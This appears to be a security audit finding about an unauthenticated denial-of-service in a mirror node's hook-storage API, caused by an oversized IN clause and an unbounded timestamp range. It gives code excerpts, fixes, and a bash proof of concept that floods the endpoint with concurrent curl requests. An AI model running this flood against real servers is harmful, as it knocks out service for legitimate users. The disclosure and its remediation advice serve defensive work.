### Title
Unbounded IN-Clause + Unrestricted Timestamp Range in `getHookStorageChange()` Enables Unauthenticated DoS via Expensive `DISTINCT ON` Table Scan

### Summary
An unprivileged user can supply up to 100 EQ key filters (the hard ceiling set by `MAX_REPEATED_QUERY_PARAMETERS`) combined with a timestamp range spanning the entire ledger history. This causes `findByKeyInAndTimestampBetween()` to execute a PostgreSQL `DISTINCT ON (key)` query with a 100-element `IN` clause over an unbounded timestamp range, forcing the DB to scan every matching row for every key before applying the result limit. Because no rate limiting is applied to this endpoint, the attack is trivially repeatable and can exhaust DB connection/CPU resources.

### Finding Description

**Controller input acceptance** (`HooksController.java`, line 108):
```java
@RequestParam(name = KEY, required = false, defaultValue = "") @Size(max = MAX_REPEATED_QUERY_PARAMETERS)
        List<SlotRangeParameter> keys,
```
`MAX_REPEATED_QUERY_PARAMETERS = 100` (Constants.java line 36). All 100 parameters may be `EQ` operators; each is appended to `keyFilters` (HooksController.java lines 174–175). No authentication or rate-limiting annotation is present on the endpoint.

**Service layer** (`HookServiceImpl.java`, lines 89–105):
```java
final var keys = request.getKeys();          // up to 100 EQ keys
final boolean requestHasKeys = !keys.isEmpty();
final var keysInRange = request.getKeysInRange();

if (keysInRange.isEmpty() && requestHasKeys) {   // early-exit only when ALL keys are out of range
    return new HookStorageResult(ownerId, List.of());
}
...
if (requestHasKeys) {
    changes = hookStorageChangeRepository.findByKeyInAndTimestampBetween(
            ownerId.getId(), hookId, keys,          // full 100-key list, not keysInRange
            timestampLowerBound, timestampUpperBound, page);
}
```
The early-exit guard (line 93) fires only when `keysInRange` is empty **and** `requestHasKeys` is true. An attacker simply supplies keys that fall within the default `[0x00…00, 0xFF…FF]` range, so `keysInRange` is non-empty and the guard is bypassed. The full `keys` list (not the filtered `keysInRange`) is forwarded to the repository.

**Repository SQL** (`HookStorageChangeRepository.java`, lines 41–63):
```sql
SELECT DISTINCT ON (key)
     owner_id, hook_id, key, value_written AS "value", ...
FROM hook_storage_change
WHERE owner_id = :ownerId
  AND hook_id  = :hookId
  AND key IN (:keys)                                          -- up to 100 entries
  AND consensus_timestamp BETWEEN :timestampLowerBound        -- attacker-controlled
                              AND :timestampUpperBound
```
`DISTINCT ON (key)` in PostgreSQL requires the engine to materialise **all** rows matching the predicate for each key before it can select the latest one per key and apply the `LIMIT` from `Pageable`. With a timestamp range of `[0, Long.MAX_VALUE]` and 100 keys, the DB must read every historical row for every requested key.

**No rate limiting** is present on the `GET /{ownerId}/hooks/{hookId}/storage` endpoint; the `HIGH_VOLUME_THROTTLE` constant in `Constants.java` is not applied here.

### Impact Explanation
Repeated concurrent requests each trigger a full historical scan of `hook_storage_change` for 100 keys. This saturates DB CPU and I/O, degrades the mirror node's ability to ingest and serve gossip-derived transaction data, and can starve legitimate queries of DB connections. Severity is **High** for availability; no data confidentiality or integrity is affected.

### Likelihood Explanation
The endpoint requires no authentication. The attack requires only a standard HTTP client. The payload is a single GET request with 100 `key=<hex>` query parameters and two `timestamp` parameters spanning the full range. It is trivially scriptable and repeatable at high concurrency from a single machine.

### Recommendation
1. **Cap the timestamp range width**: Reject or clamp requests where `timestampUpperBound - timestampLowerBound` exceeds a configurable maximum (e.g., 30 days in nanoseconds).
2. **Limit the effective IN-clause size**: Reduce `MAX_REPEATED_QUERY_PARAMETERS` for the `key` parameter on this endpoint, or add a separate, lower cap (e.g., 10).
3. **Apply rate limiting**: Add a per-IP or per-account rate limiter (e.g., via Spring's `HIGH_VOLUME_THROTTLE` mechanism already referenced in `Constants.java`) to the `/hooks/{hookId}/storage` endpoint.
4. **Rewrite the query**: Replace `DISTINCT ON` with a lateral join or a subquery that uses an index-only scan per key, so the `LIMIT` is pushed down before the full-range scan occurs.

### Proof of Concept
```bash
# Build 100 EQ key parameters (valid 32-byte hex values within default range)
KEYS=""
for i in $(seq 1 100); do
  HEX=$(printf '%064x' $i)
  KEYS="${KEYS}&key=${HEX}"
done

# Wide timestamp range spanning entire ledger history
TS="&timestamp=gte:0000000000.000000000&timestamp=lte:9999999999.999999999"

# Fire many concurrent requests
for c in $(seq 1 50); do
  curl -s "http://<mirror-node>/api/v1/accounts/0.0.1234/hooks/1/storage?limit=100${KEYS}${TS}" &
done
wait
```
Each request generates:
```sql
SELECT DISTINCT ON (key) ... FROM hook_storage_change
WHERE owner_id = 1234 AND hook_id = 1
  AND key IN (<100 keys>)
  AND consensus_timestamp BETWEEN 0 AND 9223372036854775807
```
